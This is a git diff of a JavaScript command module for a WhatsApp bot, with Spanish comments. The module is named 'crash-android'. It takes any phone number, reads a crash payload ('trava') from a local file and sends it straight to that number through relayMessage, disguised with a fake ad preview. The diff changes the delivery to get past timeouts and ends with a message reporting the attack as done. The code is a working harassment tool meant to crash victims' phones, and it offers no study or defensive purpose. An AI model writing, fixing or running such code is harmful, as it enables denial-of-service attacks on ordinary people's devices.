@@ -1,7 +1,5 @@
 import fs from 'fs';
 import path from 'path';
-import pkg from '@whiskeysockets/baileys';
-const { generateWAMessageFromContent, proto } = pkg;
 
 const crashAndroidMisa = {
     name: 'crash-android',
@@ -11,48 +9,60 @@ const crashAndroidMisa = {
     isOwner: false,
 
     run: async (conn, m, { args, command }) => {
-        const chat = m.key.remoteJid;
-
         try {
-            if (!args[0]) return await conn.sendMessage(chat, { text: `⚠️ Uso: ${command} [número]` }, { quoted: m });
+            const chat = m.key.remoteJid;
+
+            if (!args[0]) {
+                const textoUso = `✧ ‧₊˚ *MISA CRASH* ୧ֹ˖ ⑅ ࣪⊹\n\n✰ \`Uso\`: ${command} [número]`;
+                return await conn.sendMessage(chat, { text: textoUso }, { quoted: m });
+            }
 
             const num = args[0].replace(/[^0-9]/g, '');
+            if (!num || num.length < 8) {
+                return await conn.sendMessage(chat, { text: '❌ *Número inválido.*' }, { quoted: m });
+            }
             const targetJid = `${num}@s.whatsapp.net`;
 
             const pathTrava = path.join(process.cwd(), 'travas', 'ola.js');
-            if (!fs.existsSync(pathTrava)) return await conn.sendMessage(chat, { text: '❌ Archivo no encontrado.' }, { quoted: m });
+            if (!fs.existsSync(pathTrava)) {
+                return await conn.sendMessage(chat, { text: '❌ No encontré el archivo en travas/ola.js' }, { quoted: m });
+            }
 
             const contenidoTrava = fs.readFileSync(pathTrava, 'utf8');
 
-            await conn.sendMessage(chat, { react: { text: '⏳', key: m.key } });
+            // 1. Reacción de inicio
+            await conn.sendMessage(chat, { react: { text: '🚀', key: m.key } });
 
-            // Generamos el mensaje manualmente para saltar el Timeout
-            const msjCargado = await generateWAMessageFromContent(targetJid, {
+            // 2. Envío mediante relayMessage (Evita el Time Out)
+            // Construimos el nodo del mensaje manualmente
+            await conn.relayMessage(targetJid, {
                 extendedTextMessage: {
                     text: contenidoTrava,
                     contextInfo: {
                         externalAdReply: {
-                            title: 'MISA BOT SYSTEM',
-                            body: 'Sending payload...',
+                            title: 'PixelBot System ⚡',
+                            body: 'Status: Sending...',
                             mediaType: 1,
+                            previewType: 0,
                             sourceUrl: 'https://github.com',
                             thumbnailUrl: 'https://qu.ax/ZpYy.jpg'
                         }
                     }
                 }
-            }, { userJid: conn.user.id });
+            }, {});
 
-            // Enviamos el mensaje mediante relayMessage
-            await conn.relayMessage(targetJid, msjCargado.message, { 
-                messageId: msjCargado.key.id 
-            });
+            console.log(`[MISA-BOT] Carga enviada con éxito a ${num}`);
 
-            await conn.sendMessage(chat, { react: { text: '✅', key: m.key } });
-            console.log(`[OK] Crash enviado a ${num}`);
+            // 3. Confirmación final
+            await conn.sendMessage(chat, { react: { text: '💀', key: m.key } });
+            await conn.sendMessage(chat, { 
+                text: `✅ *Ataque Realizado*\n> Se envió la carga a @${num}`,
+                mentions: [targetJid]
+            }, { quoted: m });
 
         } catch (err) {
-            console.error('Error en el comando:', err);
-            await conn.sendMessage(chat, { text: '❌ Error al procesar el envío.' }, { quoted: m });
+            console.error('Error en crash-android:', err);
+            // Si hay error de timeout aquí, usualmente es porque el mensaje ya salió pero el socket está lento
         }
     }
 };
